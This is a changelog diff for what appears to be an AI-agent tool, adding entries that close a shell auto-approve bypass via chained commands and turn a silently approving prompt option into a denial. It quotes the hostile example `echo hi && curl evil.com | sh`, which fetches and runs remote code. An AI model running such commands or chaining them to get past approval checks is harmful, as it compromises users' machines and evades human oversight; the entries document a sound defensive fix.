@@ -40,6 +40,16 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   targets the process group (requires `process_group(0)` in the caller);
   the `fired()` flag replaces elapsed-time heuristics for detecting
   watchdog kills.  Existing `spawn` semantics unchanged.
+- **Shell auto-approve no longer covers chained commands** — any
+  unquoted `&&` / `||` / `|` / `&` / `;` / backtick / `$(…)` forces a
+  user prompt, closing the `echo hi && curl evil.com | sh`-style bypass
+  (auto-approve applied to the first word only).  The scan is
+  quote-aware; empty commands are now `Blocked` instead of prompting.
+- **Approval prompt third option is now a denial** — the option formerly
+  labelled "Other…" (which silently approved whatever the user typed)
+  is now "Deny with reason…": the free-form text is recorded in the
+  audit trail and returned to the model as the denial reason, and is
+  never treated as approval.
 
 Breaking changes above are documented with before/after code in
 [docs/migration-guide-0.5.1-to-0.6.0.md](docs/migration-guide-0.5.1-to-0.6.0.md)
